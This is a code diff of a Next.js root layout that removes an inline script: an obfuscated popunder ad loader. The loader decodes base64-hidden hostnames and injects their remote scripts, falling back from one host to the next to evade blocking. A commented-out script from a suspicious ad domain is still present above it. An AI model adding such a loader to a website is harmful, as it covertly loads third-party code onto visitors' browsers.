@@ -92,29 +92,6 @@ export default function RootLayout({
           src="//electricalglimmerexasperate.com/38/d2/7f/38d27f8b2d77fdccea6d13daa02acecf.js"
           strategy="lazyOnload"
         /> */}
-        <script
-          type="text/javascript"
-          data-cfasync="false"
-          dangerouslySetInnerHTML={{
-            __html: ` /*<![CDATA[*/ (function(){ var w =
-      window, s = "ed36e9ff04fc2440cafa7457c2363562", c = [ ["siteId", 787 + 83
-      * 816 - 933 + 358 + 5110698], ["minBid", 0], ["popundersPerIP", "0"],
-      ["delayBetween", 0], ["default", false], ["defaultPerDay", 0],
-      ["topmostLayer", "auto"] ], k = [
-      "d3d3LmNkbjRhZHMuY29tL3pqc2NoYW5uZWwubWluLmNzcw==",
-      "ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvdUxtL2h0d28ubWluLmpz",
-      "d3d3LnlwbXR2bGFrdG0uY29tL3lqc2NoYW5uZWwubWluLmNzcw==",
-      "d3d3LmpsdHJob2JnLmNvbS9NWmJJL2N0d28ubWluLmpz" ], o = -1, r, h, u =
-      function(){ clearTimeout(h); o++; if(k[o] && !(1766377004000 < (new
-      Date).getTime() && 1 < o)){ r = w.document.createElement("script"); r.type
-      = "text/javascript"; r.async = true; var e =
-      w.document.getElementsByTagName("script")[0]; r.src = "https://" +
-      atob(k[o]); r.crossOrigin = "anonymous"; r.onerror = u; r.onload =
-      function(){ clearTimeout(h); w[s.slice(0,16) + s.slice(0,16)] || u(); }; h
-      = setTimeout(u, 5E3); e.parentNode.insertBefore(r, e); } }; if(!w[s]){
-      try{ Object.freeze(w[s] = c); } catch(e){} u(); } })(); /*]]>*/ `,
-          }}
-        />
       </head>
       <body className={inter.className} suppressHydrationWarning>
         <SupabaseProvider>
